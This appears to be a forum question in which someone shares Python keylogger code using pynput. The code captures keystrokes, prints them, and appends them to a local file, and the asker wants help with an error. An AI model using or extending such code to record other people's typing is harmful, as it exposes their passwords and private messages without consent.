# Why my keys are shown in the terminal after the execution of the code, giving me errors?

I was writing a simple python code for keylogger, it worked fine until I saved and closed the file. After I reopen the file, it is now giving me this error. I am not able to figure out the reason behind the error.

`
import pynput
from pynput.keyboard import Key,Listener

count = 0
keys = []


def write_file(keys):
    with open("thefile.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k == Key.space:
                f.write(" ")
            if k == Key.enter:
                f.write("\n")
            f.write(k)


def press(key):
    global count,keys
    keys.append(key)         #this will update the keys list everytime we press the keys.
    count += 1               #this will count the number of presses
    print("{0} pressed".format(key)) #this will print every key being printed
    if count >=5:
        count = 0
        write_file(keys)
        keys = []

def release(key):
    if key == Key.esc:
        return False


with Listener(on_press= press, on_release= release) as listener:
    listener. Join()
